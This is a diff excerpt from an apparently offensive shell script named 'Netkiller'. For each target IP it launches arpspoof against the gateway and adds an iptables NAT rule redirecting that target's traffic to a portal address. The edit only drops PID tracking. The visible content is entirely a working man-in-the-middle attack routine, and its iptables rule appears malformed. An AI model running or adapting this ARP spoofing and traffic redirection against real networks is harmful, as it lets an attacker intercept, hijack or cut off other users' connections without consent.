@@ -239,11 +239,9 @@ fi
 echo " "
 
 # Start ARP spoofing for each target
-PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-     PIDS+=($!)
      iptables -t nat -A REDIRECT -s "$TARGET" -j DNAT --to-destination "$PORTAL"
 done
 echo " "
